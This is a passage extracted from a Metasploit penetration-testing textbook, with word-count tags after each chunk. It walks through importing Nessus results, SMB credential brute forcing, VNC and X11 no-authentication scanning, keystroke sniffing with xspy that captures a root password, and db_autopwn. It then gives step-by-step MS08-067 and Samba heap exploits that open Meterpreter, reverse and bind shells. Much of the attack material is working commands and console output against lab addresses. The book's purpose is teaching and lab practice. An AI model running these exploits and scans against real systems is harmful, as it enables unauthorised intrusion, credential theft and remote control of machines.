[*]        nessus_scan_new <policy id> <scan name> <targets>
[*]        use nessus_policy_list to list all available policies
msf > nessus_scan_new 2 bridge_scan 192.168.1.195
[*] Creating scan from policy number 2, called "bridge_scan" and scanning 192.168.1.195
[*] Scan started.  uid is d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
[Word Count: 39]

7.
While your scan is in progress, you can see its status by running the 
nessus_scan_status command. When this command’s output responds 
with “No Scans Running,” as shown next, you will know that your scan 
has completed.
[Word Count: 37]

msf > nessus_scan_status
[*] No Scans Running.
[Word Count: 7]

8.
After the scan has completed, you can list the available scan reports with 
the nessus_report_list command. Identify the ID of the report you want 
to import and enter nessus_report_get to download the report and import 
it into the Metasploit database automatically.
[Word Count: 42]

msf > nessus_report_list
[+] Nessus Report List
[Word Count: 7]

ID                                                    Name         Status     Date
--                                                    ----         ------     ----
074dc984-05f1-57b1-f0c9-2bb80ada82fd3758887a05631c1d  Host_195     completed  19:43 Mar 08 2011
d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e  bridge_scan  completed  09:37 Mar 09 2011
[Word Count: 22]

[*] You can:
[*] Get a list of hosts from the report: nessus_report_hosts <report id>
msf > nessus_report_get d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
[*] importing d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
[*] 192.168.1.195 Microsoft Windows XP Professional (English)  Done!
[+] Done
[Word Count: 32]

9.
Finally, as with the other import functions demonstrated in this chapter, 
you can use db_hosts to verify that the scan data was imported successfully:
[Word Count: 25]

address        svcs  vulns
-------        ----  -----
192.168.1.195  18    345
[Word Count: 9]

Now that you’ve seen the variation in scan results from two different 
products, you should have a better sense of the merit in using more than one 
tool for your scanning needs. It is still up to the penetration tester to interpret 
the results from these automated tools and turn them into actionable data.
[Word Count: 54]

Although many commercial vulnerability scanners are available on the market, 
you are not limited to them. When you want to run a scan for a specific vul-
nerability across a network, Metasploit’s many auxiliary modules can help 
you accomplish such tasks. 
The following Metasploit modules are just a few examples of the many 
useful auxiliary scanning modules included in the Framework. Take advan-
tage of your lab to probe and explore as many of them as you can.
[Word Count: 78]

msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > show options
[Word Count: 9]

Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   PASS_FILE                       no        File containing passwords, one per line
   RHOSTS                          yes       The target address range or CIDR identifier
   RPORT          445              yes       Set the SMB service port
   SMBDomain      WORKGROUP        no        SMB Domain
   SMBPass        password         no        SMB Password
   SMBUser        Administrator    no        SMB Username
   THREADS        50               yes       The number of concurrent threads
   USERPASS_FILE                   no        File containing users and passwords separated
by space, one pair per line
   USER_FILE                       no        File containing usernames, one per line
[Word Count: 79]

msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-155
RHOSTS => 192.168.1.170-192.168.1.175
msf auxiliary(smb_login) > set SMBUser Administrator
SMBUser => Administrator
msf auxiliary(smb_login) > set SMBPass s3cr3t
SMBPass => s3cr3t
msf auxiliary(smb_login) > run
[*] Starting host 192.168.1.154
[*] Starting host 192.168.1.150
[*] Starting host 192.168.1.152
[*] Starting host 192.168.1.151
[*] Starting host 192.168.1.153
[*] Starting host 192.168.1.155
X [+] 192.168.1.155 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
[*] Scanned 4 of 6 hosts (066% complete)
[*] Scanned 5 of 6 hosts (083% complete)
[*] Scanned 6 of 6 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) >
[Word Count: 98]

You can see a successful login with user Administrator and a password of 
s3cr3t at X. Because workstations are all cloned from one image and deployed 
through the enterprise in many corporate environments, the administrator 
password may well be the same on all of them, granting you access to every 
workstation on the network.
[Word Count: 54]

Virtual network computing (VNC) provides graphical access to remote sys-
tems in a way that’s similar to Microsoft’s Remote Desktop. VNC installations 
are common throughout corporations, because they provide a GUI-based 
view of server and workstation desktops. VNC is frequently installed to meet a 
temporary need and then completely forgotten and left unpatched, creating
[Word Count: 54]

a major potential vulnerability. Metasploit’s built-in VNC Authentication 
None scanner searches a range of IP addresses for VNC servers that do not 
have a password configured (that support “None” authentication, meaning a 
blank password). Usually, this scan will turn up nothing of value, but a good 
penetration tester leaves no stone unturned when looking for ways access a 
target system.
[Word Count: 60]

NOTE
Recent VNC servers do not allow blank passwords. To set one up in your lab for testing, 
use older VNC servers such as RealVNC 4.1.1.
[Word Count: 26]

The VNC scanner, like most Metasploit auxiliary modules, is easy to con-
figure and run. The only required configuration for vnc_none_auth is to supply 
it with an IP or a range of IPs to scan. Simply select the module, define your 
RHOSTS and THREADS, if desired, and run it, as shown next:
[Word Count: 52]

msf > use auxiliary/scanner/vnc/vnc_none_auth
msf auxiliary(vnc_none_auth) > show options
[Word Count: 9]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    5900             yes       The target port
   THREADS  1                yes       The number of concurrent threads
[Word Count: 32]

msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.155
RHOSTS => 192.168.1.155
msf auxiliary(vnc_none_auth) > run
[Word Count: 13]

[*] 192.168.1.155:5900, VNC server protocol version : RFB 003.008
[*] 192.168.1.155:5900, VNC server security types supported : None
X [*] 192.168.1.155:5900, VNC server security types includes None, free access!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(vnc_none_auth) >
[Word Count: 45]

If you get lucky and Metasploit finds a VNC server with no authentica-
tion X, you can use Back|Track’s vncviewer to connect to the target machine 
without a password, as shown in Figure 4-18.
[Word Count: 34]

Figure 4-18: Connecting to VNC with no authentication using vncviewer
[Word Count: 10]

Author: You in the us? or out of country? I know some people 
in denmark.
[Word Count: 15]

Attacker: I’m from Norway actually, hehe, I have relatives 
in Denmark.
[Word Count: 11]

Author: You hang in any boards? like I used to like some but they 
have been going away
[Word Count: 18]

Attacker: I mostly hang in some programming boards, but not much 
else. Have you been into hacking for a long time or what? What’s 
your age btw? I’m 22.
[Word Count: 29]

Author: I have been on this for like fun for around a year or so. Still 
in school. 16. Just something to do.
[Word Count: 23]

Attacker: Haven’t been there. I too mostly do this for fun, just trying 
to see what I can do, test my skills. I wrote the “VNC finder” myself 
btw, I have found a lot of servers, but this is the only one where I 
could actually have some fun
[Word Count: 49]

Author: Wow. What did you write it in? Can I dl it? Do you have 
a handle?
[Word Count: 17]

Attacker: It’s written in a language called PureBasic, but it’s kinda 
not ready for release yet, it’s only for my own use. But maybe I can 
share it anyway, I could upload the code somewhere and let you 
compile it. That is if you can find some PureBasic compiler on 
some warez site :P
[Word Count: 54]

Author: Thats cool. you can put it in that pastebin site from irc. 
That lets you anon post I have not done purebasic before. just 
python and perl
[Word Count: 28]

Attacker: Let me see, I'll look for that pastebin site and upload it, 
just give me some minutes, I’ll be around.
[Word Count: 21]

The attacker then gave the author a link to a pastebin page with the full 
source for the custom VNC scanner he was using.
[Word Count: 24]

Metasploit’s built-in open_x11 scanner is similar to the vnc_auth scanner, 
in that it scours a range of hosts for X11 servers that allow users to connect 
without authentication. Although X11 servers aren’t widely used today, lots
[Word Count: 36]

msf > use auxiliary/scanner/x11/open_x11
msf auxiliary(open_x11) > show options
[Word Count: 9]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    6000             yes       The target port
   THREADS  1                yes       The number of concurrent threads
[Word Count: 32]

msf auxiliary(open_x11) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(open_x11) > set THREADS 50
THREADS => 50
msf auxiliary(open_x11) > run
[*] Trying 192.168.1.1
[*] Trying 192.168.1.0
[*] Trying 192.168.1.2...
[*] Trying 192.168.1.29
[*] Trying 192.168.1.30
[*] Open X Server @ 192.168.1.23 (The XFree86 Project, Inc)
[*] Trying 192.168.1.31
[*] Trying 192.168.1.32
[Word Count: 53]

[*] Trying 192.168.1.253
[*] Trying 192.168.1.254
[*] Trying 192.168.1.255
[*] Auxiliary module execution completed
[Word Count: 14]

To see what an attacker could do with a vulnerability like this, start key-
stroke logging using Back|Track’s xspy tool, like so:
[Word Count: 22]

root@bt:/# cd /pentest/sniffers/xspy/
root@bt:/pentest/sniffers/xspy# ./xspy -display 192.168.1.23:0 -delay 100
[Word Count: 9]

ssh root@192.168.1.11(+BackSpace)37
sup3rs3cr3tp4s5w0rd
ifconfig
exit
[Word Count: 5]

The xspy tool remotely sniffs the X server’s keyboard session and has cap-
tured a user running SSH to log in as root on a remote system. Vulnerabilities 
such as this can be rare, but when you find them they are extremely valuable.
[Word Count: 43]

msf > db_connect postgres:toor@127.0.0.1/msf3
msf > db_import /root/nessus.nbe
msf > db_autopwn –e –t –r -x -p
[Word Count: 16]

X [*] (1/72 [0 sessions]): Launching exploit/windows/mssql/ms09_004_sp_replwritetovarbin
against 192.168.33.130:1433...
[*] (2/72 [0 sessions]): Launching exploit/windows/smb/psexec against 192.168.33.130:445...
[*] (3/72 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against
192.168.33.130:445...
[Word Count: 25]

[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
Y [*] Meterpreter session 1 opened (192.168.1.101:40912 -> 192.168.1.115:15991)
[*] (72/72 [1 sessions]): Waiting on 2 launched modules to finish execution...
[*] (72/72 [1 sessions]): Waiting on 0 launched modules to finish execution...
[Word Count: 46]

Based on these scans, Autopwn launched 72 exploits X and one was suc-
cessful, as shown at Y. This exploit allows us full access to the machine with a 
Meterpreter console that will be discussed in far more depth in Chapter 6.
[Word Count: 42]

NOTE
One big caveat to remember when using Autopwn: If you’re going in with your Autopwn 
guns blazing, the target system can crash or lose stability. Autopwn has useful features 
not covered here, such as the ability to select only exploits that have an “Excellent” rank-
ing, meaning it is very unlikely they will crash the remote system or service. For more 
information on its usage, enter db_autopwn –h.
[Word Count: 69]

T H E  J O Y  O F  E X P L O I T A T I O N
[Word Count: 20]

point forward will occur through msfconsole, and you will need a solid under-
standing of msfconsole, msfpayload, and msfencode to get the most out of the 
balance of this book.
[Word Count: 30]

The Metasploit Framework contains hundreds of modules, and it’s nearly 
impossible to remember them all. Running show from msfconsole will display 
every module available in the Framework, but you can also narrow your search 
by displaying only specific types of modules as discussed in the following 
sections.
[Word Count: 47]

Within msfconsole, exploits operate against the vulnerabilities that you dis-
cover during a penetration test. New exploits are always being developed, 
and the list will continue to grow. This command will display every currently 
available exploit within the Framework.
[Word Count: 39]

Auxiliary modules in Metasploit can be used for a wide range of purposes. 
They can operate as scanners, denial-of-service modules, fuzzers, and much 
more. This command will display them and list their features.
[Word Count: 33]

Options control various settings needed for proper functionality of the 
Framework modules. When you run show options while a module is selected, 
Metasploit will display only the options that apply to that particular module. 
Entering msf> show options when not in a module will display the available 
global options—for example, you can set LogLevel to be more verbose as you 
perform an attack. You can also issue the back command to go back once 
inside a module.
[Word Count: 77]

msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > back
msf >
[Word Count: 10]

The search command is useful for finding a specific attack, auxiliary 
module, or payload. For example, if you want to launch an attack against 
SQL, you could search for SQL like this:
[Word Count: 32]

msf > search mssql
[*] Searching loaded modules for pattern 'mssql'...
[Word Count: 11]

Name                       Disclosure Date  Rank    Description
   ----                       ---------------  ----    -----------
   admin/mssql/mssql_enum                      normal  Microsoft SQL Server Configuration
Enumerator
   admin/mssql/mssql_exec                      normal  Microsoft SQL Server xp_cmdshell
Command Execution
   admin/mssql/mssql_idf                       normal  Microsoft SQL Server - Interesting
Data Finder
   admin/mssql/mssql_sql                       normal  Microsoft SQL Server Generic Query
   scanner/mssql/mssql_login                   normal  MSSQL Login Utility
   scanner/mssql/mssql_ping                    normal  MSSQL Ping Utility
Exploits
[Word Count: 51]

Or, to find the MS08-067 exploit specifically (an exploit related to the 
notorious Conficker worm that exploited a weakness within the Remote 
Procedure Call [RPC] service), you would enter this command:
[Word Count: 31]

msf > search ms08_067
[*] Searching loaded modules for pattern 'ms08_067'...
[Word Count: 11]

Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack Corruption
[Word Count: 15]

Then, having found an exploit (windows/smb/ms08_067_netapi), you could 
load the found module with the use command, like so:
[Word Count: 18]

msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) >
[Word Count: 7]

Notice that when we issue the use windows/smb/ms08_067_netapi command, 
the msf prompt changes as follows:
[Word Count: 15]

This indicates that we have selected the ms08_067_netapi module and 
that commands issued at this prompt will be performed under that exploit.
[Word Count: 22]

NOTE
You can perform a search or use at any time within an exploit to switch to a different 
exploit or module.
[Word Count: 22]

Now, with the prompt reflecting our chosen module, we can enter show 
options to display the options specific to the MS08-067 exploit:
[Word Count: 22]

msf exploit(ms08_067_netapi) > show options
[Word Count: 5]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
[Word Count: 32]

Id  Name
   --  ----
   0   Automatic Targeting
[Word Count: 7]

This contextual approach to accessing options keeps the interface simpler 
and allows you to focus only on the options that matter at the moment.
[Word Count: 24]

Recall from Chapter 2 that payloads are platform-specific portions of code 
delivered to a target. As with show options, when you run show payloads from a 
module-specific prompt, Metasploit displays only the payloads that are com-
patible with that module. In the case of Microsoft Windows–based exploits, 
these payloads may be as simple as a command prompt on the target or as 
complex as a full graphical interface on the target machine. To see an active 
list of payloads, run the following command:
[Word Count: 83]

This would show you all payloads available in Metasploit; however, if you 
are in an actual exploit, you will see only payloads applicable to the attack. 
For example, running show payloads from the msf exploit(ms08_067_netapi) 
prompt would result in the output shown next.
In the previous example we searched for the MS08-067 module. Now 
let’s find out the payloads for that module by entering show payloads. Notice 
in the example that only Windows-based payloads are shown. Metasploit 
will generally identify the type of payloads that can be used with a particu-
lar attack.
[Word Count: 93]

msf exploit(ms08_067_netapi) > show payloads
[Word Count: 5]

Name                                             Rank    Description
----
----
-----------
[Word Count: 6]

windows/shell/reverse_ipv6_tcp                   normal  Windows Command Shell, Reverse TCP
Stager (IPv6)
windows/shell/reverse_nonx_tcp                
normal  Windows Command Shell, Reverse TCP
Stager (No NX or Win7)
windows/shell/reverse_ord_tcp                 
normal  Windows Command Shell, Reverse
Ordinal TCP Stager (No NX or Win7)
windows/shell/reverse_tcp                     
normal  Windows Command Shell, Reverse TCP
Stager
windows/shell/reverse_tcp_allports            
normal  Windows Command Shell, Reverse
All-Port TCP Stager
windows/shell_bind_tcp                        
normal  Windows Command Shell, Bind TCP
Inline
windows/shell_reverse_tcp                     
normal  Windows Command Shell, Reverse TCP
[Word Count: 66]

Next, we enter set payload windows/shell/reverse_tcp to select the reverse_tcp 
payload. When we enter show options again we see that additional options 
are shown:
[Word Count: 24]

msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp X
payload => windows/shell/reverse_tcp
msf exploit(ms08_067_netapi) > show options Y
[Word Count: 16]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
[Word Count: 32]

Z
Payload options (windows/shell/reverse_tcp):
[Word Count: 4]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST                      yes       The local address
   LPORT     4444             yes       The local port
[Word Count: 28]

msf exploit(ms08_067_netapi) > show targets
[Word Count: 5]

Id  Name
   --  ----
X   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (NX)
   4   Windows XP SP3 English (NX)
   5   Windows 2003 SP0 Universal
   6   Windows 2003 SP1 English (NO NX)
   7   Windows 2003 SP1 English (NX)
   8   Windows 2003 SP2 English (NO NX)
   9   Windows 2003 SP2 English (NX)
[Word Count: 60]

In this example, you can see that the exploit lists Automatic Targeting X 
as one option. Often, an exploit module will attempt to target the operating 
system automatically based on its version and select an exploit based on the 
system’s fingerprint. However, it’s often best to try to identify the appropriate 
exploit yourself to avoid triggering the wrong exploit or a potentially destruc-
tive one.
[Word Count: 65]

NOTE
This particular exploit is temperamental, and it has a tough time determining the oper-
ating system. If you use this exploit, be sure to set the target as the specific operating system 
you use in testing on your VM (Windows XP SP2).
[Word Count: 43]

When the short description of a module provided by the show and search com-
mands isn’t sufficient, use the info command followed by the module name 
to display all the information, options, and targets available for that module:
[Word Count: 38]

All the options for a given Metasploit module must be either set or unset, 
especially if they are marked as required or yes. When you enter show options, 
you will see information that specifies whether a field is required. Use the set 
command to set an option (turn it on); use unset to turn a setting off. The 
next listing shows the set and unset commands in use.
[Word Count: 68]

NOTE
Notice that the variables are referenced using uppercase characters. This isn’t required, 
but it is considered good practice.
[Word Count: 19]

msf exploit(ms08_067_netapi) > set RHOST 192.168.1.155 X
RHOST => 192.168.1.155
msf exploit(ms08_067_netapi) > set TARGET 3 Y
TARGET => 3
msf exploit(ms08_067_netapi) > show options Z
[Word Count: 26]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.1.155    yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
[Word Count: 33]

Id  Name
   --  ----
   3   Windows XP SP2 English (NX)
[Word Count: 10]

msf exploit(ms08_067_netapi) > unset RHOST
Unsetting RHOST...
[Word Count: 7]

At X we set the target IP address (RHOST) to 192.168.1.155 (our target 
machine). At Y we set the target to 3, the “Windows XP SP2 English (NX)” 
that we listed with show targets in “msf> show targets” on page 62. Running 
show options at Z confirms that our settings have been populated, as shown in 
the Module options output.
[Word Count: 60]

The setg and unsetg commands are used to set or unset a parameter globally 
within msfconsole. Using these commands can save you from having to re-enter 
the same information repeatedly, particularly in the case of frequently used 
options that rarely change, such as LHOST.
[Word Count: 44]

Having configured global options with the setg command, use the save com-
mand to save your current settings so they will be available next time you run 
the console. You can enter the save command at any time in Metasploit to 
save your current place.
[Word Count: 45]

msf exploit(ms08_067_netapi) > save
Saved configuration to: /root/.msf3/config
msf exploit(ms08_067_netapi) >
[Word Count: 11]

The location in which the configuration is stored, /root/.msf3/config, is 
shown on the screen. If for some reason you need to start over, move or delete 
this file to revert to the default settings.
[Word Count: 34]

root@bt:/root# cd /opt/framework3/msf3/
root@bt:/opt/framework3/msf3# msfconsole
[Word Count: 5]

msf > nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130 X
[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130
[Word Count: 17]

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
NSE: Script Scanning completed.
Nmap scan report for 192.168.33.130
Host is up (0.00050s latency).
Not shown: 991 closed ports
[Word Count: 39]

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.2180
80/tcp   open  http         Microsoft IIS webserver 5.1
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
443/tcp  open  https?
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003 Z
Network Distance: 1 hop
Service Info: Host: ihazsecurity; OS: Windows
[Word Count: 90]

Host script results:
 smb-check-vulns:
   MS08-067: VULNERABLE Y
   Conficker: Likely CLEAN
   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)
   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)
[Word Count: 27]

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
msf >
[Word Count: 27]

identified as possibly Windows 2003, but the system is missing key ports that 
would be associated with the Server Edition.) We’ll assume that our target is 
running the English version of XP.
Let’s walk through the actual exploitation. First the setup:
[Word Count: 41]

msf > search ms08_067_netapi X
[*] Searching loaded modules for pattern 'ms08_067_netapi'...
[Word Count: 12]

Name                         Rank   Description
   ----                         ----   -----------
   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack 
Corruption
[Word Count: 15]

msf > use windows/smb/ms08_067_netapi Y
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp Z
payload => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > show targets [
[Word Count: 21]

Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (NX) \
   4   Windows XP SP3 English (NX)
   5   Windows 2003 SP0 Universal
   6   Windows 2003 SP1 English (NO NX)
   7   Windows 2003 SP1 English (NX)
   8   Windows 2003 SP2 English (NO NX)
   9   Windows 2003 SP2 English (NX)
[Word Count: 60]

msf exploit(ms08_067_netapi) > set TARGET 3
target => 3
msf exploit(ms08_067_netapi) > set RHOST 192.168.33.130 ]
RHOST => 192.168.33.130
msf exploit(ms08_067_netapi) > set LHOST 192.168.33.129 ^
LHOST => 192.168.33.129
msf exploit(ms08_067_netapi) > set LPORT 8080 _
LPORT => 8080
msf exploit(ms08_067_netapi) > show options `
[Word Count: 45]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.33.130   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
[Word Count: 33]

Payload options (windows/meterpreter/reverse_tcp):
[Word Count: 3]

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.33.129   yes       The local address
   LPORT     8080             yes       The local port
[Word Count: 29]

Id  Name
   --  ----
   3   Windows XP SP2 English (NX)
[Word Count: 10]

Having set the stage, we’re ready to conduct the actual exploitation:
[Word Count: 11]

msf exploit(ms08_067_netapi) > exploit X
[*] Started reverse handler on 192.168.33.129:8080
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487) Y
msf exploit(ms08_067_netapi) > sessions -l Z
[Word Count: 35]

Id  Type         Information  Connection
  --  ----         -----------  ----------
  1   meterpreter               192.168.33.129:8080 -> 192.168.33.130:1036 [
[Word Count: 14]

msf exploit(ms08_067_netapi) > sessions -i 1 \
[*] Starting interaction with 1...
[Word Count: 12]

meterpreter > shell ]
Process 4060 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 20]

Let’s try a different exploit on an Ubuntu 9.04 virtual machine. The steps are 
pretty much the same as for the preceding exploit except that we will select a 
different payload.
[Word Count: 31]

msf > nmap -sT -A -P0 192.168.33.132
[*] exec: nmap -sT -A -P0 192.168.33.132
[Word Count: 14]

Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT
Warning: Traceroute does not support idle or connect scan, disabling...
Nmap scan report for 192.168.33.132
Host is up (0.00048s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1) X
|_html-title: Index of /
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME) Y
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
MAC Address: 00:0C:29:21:AD:08 (VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
[Word Count: 91]

Host script results:
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
|   OS: Unix (Samba 3.0.24)
|   Name: MSHOME\Unknown
|_  System time: 2011-03-15 17:39:57 UTC-4
[Word Count: 35]

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
[Word Count: 25]

We see three open ports: 80, 139, and 445. The message at X tells us that 
the system is running Ubuntu, and at Y we see that it is running a version of 
Samba 3.x and Apache 2.2.3 with PHP 5.2.1.
Let’s search for a Samba exploit and try it against the system:
[Word Count: 53]

msf > search samba
[*] Searching loaded modules for pattern 'samba'...
[Word Count: 11]

Auxiliary
=========
   Name                               Rank    Description
   ----                               ----    -----------
   admin/smb/samba_symlink_traversal  normal  Samba Symlink Directory Traversal
   dos/samba/lsa_addprivs_heap        normal  Samba lsa_io_privilege_set Heap Overflow
   dos/samba/lsa_transnames_heap      normal  Samba lsa_io_trans_names Heap Overflow
[Word Count: 26]

Name                                 Rank       Description
   ----                                 ----       -----------
   linux/samba/lsa_transnames_heap      good       Samba lsa_io_trans_names . . .
[Word Count: 13]

msf > use linux/samba/lsa_transnames_heap
msf exploit(lsa_transnames_heap) > show payloads
[Word Count: 9]

Name                              Rank    Description
   ----                              ----    -----------
   generic/debug_trap                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp            normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp         normal  Generic Command Shell, Reverse TCP Inline
   linux/x86/adduser                 normal  Linux Add User
   linux/x86/chmod                   normal  Linux Chmod
   linux/x86/exec                    normal  Linux Execute Command
   linux/x86/metsvc_bind_tcp         normal  Linux Meterpreter Service, Bind TCP
   linux/x86/metsvc_reverse_tcp      normal  Linux Meterpreter Service, Reverse TCP Inline
   linux/x86/shell/bind_ipv6_tcp     normal  Linux Command Shell, Bind TCP Stager (IPv6)
   linux/x86/shell/bind_tcp          normal  Linux Command Shell, Bind TCP Stager
[Word Count: 74]

msf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp
payload => linux/x86/shell_bind_tcp
msf exploit(lsa_transnames_heap) > set LPORT 8080
LPORT => 8080
msf exploit(lsa_transnames_heap) > set RHOST 192.168.33.132
RHOST => 192.168.33.132
msf exploit(lsa_transnames_heap) > exploit
[Word Count: 31]

[*] Creating nop sled....
[*] Started bind handler
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...
[Word Count: 22]

[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)
ifconfig
eth1      Link encap:Ethernet  HWaddr 00:0C:29:21:AD:08
          inet addr:192.168.33.132  Bcast:192.168.33.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3178 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:292351 (285.4 KiB)  TX bytes:214234 (209.2 KiB)
          Interrupt:17 Base address:0x2000
[Word Count: 63]

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
[Word Count: 34]

This type of exploit, called a heap-based attack, takes advantage of dynamic 
memory allocation, but it isn’t 100 percent reliable. (You may need to attempt 
the exploit command a few times if it doesn’t work the first time.)
Notice in this example that we used a bind shell to set up a listener port 
on the target machine; Metasploit handles the direct connection to the system 
automatically for us. (Remember to use the reverse payload when attacking 
through a firewall or NAT.)
[Word Count: 82]

msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set LHOST 192.168.33.129
lhost => 192.168.33.129
smsf exploit(ms08_067_netapi) > set RHOST 192.168.33.130
rhost => 192.168.33.130
msf exploit(ms08_067_netapi) > set TARGET 3
target => 3
msf exploit(ms08_067_netapi) > search ports
[*] Searching loaded modules for pattern 'ports'...
[Word Count: 43]

Name                               
 Rank    Description
   ----                                  
 ----    -----------
   windows/dllinject/reverse_tcp_allports 
normal  Reflective Dll Injection,
Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_allports  normal  Windows Meterpreter (Reflective
Injection), Reverse All-Port TCP Stager
[Word Count: 25]

msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp_allports
payload => windows/meterpreter/reverse_tcp_allports
msf exploit(ms08_067_netapi) > exploit -j
[*] Exploit running as background job.
[Word Count: 20]

msf exploit(ms08_067_netapi) >
[*] Started reverse handler on 192.168.33.129:1 X
[*] Triggering the vulnerability...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) Y
[Word Count: 28]

msf exploit(ms08_067_netapi) > sessions -l -v
[Word Count: 6]

Id  Type         Information                         Connection                               Via
  --  ----         -----------                         ----------                               ---
  1   meterpreter  NT AUTHORITY\SYSTEM @ IHAZSECURITY  192.168.33.129:1 -> 192.168.33.130:1047  
exploit/windows/smb/ms08_067_netapi
[Word Count: 20]

msf exploit(ms08_067_netapi) > sessions -i 1
[*] Starting interaction with 1...
[Word Count: 11]

Notice that we do not set an LPORT; instead, we use allports because we 
are going to try to connect out of the network on each port until we find an 
